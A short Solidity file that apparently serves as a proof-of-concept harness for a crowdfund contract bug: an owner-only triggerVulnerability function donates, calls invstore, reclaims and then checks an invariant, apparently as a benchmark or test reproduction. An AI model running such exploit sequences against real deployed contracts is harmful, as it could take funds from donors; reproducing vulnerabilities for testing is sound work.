interface ICrowdfund {
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
    function invstore() external;
    function invariant(uint choice) external;
}

contract Reproduction {
    ICrowdfund public target;
    address public owner;

    constructor(address _target) {
        target = ICrowdfund(_target);
        owner = msg.sender;
    }

    function triggerVulnerability() external payable {
        require(msg.sender == owner);

        target.donate{value: msg.value}();
        target.invstore();
        target.reclaim();
        target.invariant(0);
    }

    receive() external payable {}
}